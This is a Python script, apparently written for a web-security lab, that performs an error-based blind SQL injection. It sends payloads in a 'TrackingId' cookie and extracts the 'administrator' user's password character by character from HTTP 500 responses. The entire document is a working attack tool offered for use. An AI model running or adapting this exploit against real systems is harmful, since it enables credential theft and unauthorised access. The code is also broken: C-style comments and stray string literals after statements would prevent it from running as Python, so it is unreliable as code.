import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = "" #saving the password
    for i in range(1,21):   #for 20 char length Pw
        for j in range(32,126): #ascii match brute
            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j) /*SQL Query to executed*/
            
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)

            cookies = {'TrackingId': 'tJuCgXXSVbqRHztC' + sqli_payload_encoded, 'session': 'BKp2jzhGhkyEMRfswi40nFgmvglTst48'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies) /*set the cookies*/

            if r.status_code == 500:   """found a char and append to final pw"""
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j)) /*display extracted till now and display char trying*/
                sys.stdout.flush()

def main():
    if len(sys.argv) !=2:     '''to display Usage instructions'''
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)         #exit program

    url = sys.argv[1]         #got the url argument correct
    print("(+) Retreiving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()
